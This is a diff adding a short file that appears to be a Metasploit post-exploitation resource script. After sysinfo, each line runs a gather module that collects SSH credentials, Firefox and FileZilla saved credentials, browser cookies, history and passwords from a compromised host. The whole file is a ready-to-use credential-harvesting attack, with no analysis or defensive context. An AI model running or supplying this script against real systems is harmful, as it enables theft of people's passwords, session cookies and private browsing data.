@@ -1,0 +1,8 @@
+sysinfo
+run post/multi/gather/enum_vbox
+run post/multi/gather/ssh_creds
+run post/multi/gather/firefox_creds
+run post/multi/gather/filezilla_client_cred
+run post/firefox/gather/cookies
+run post/firefox/gather/history
+run post/firefox/gather/passwords
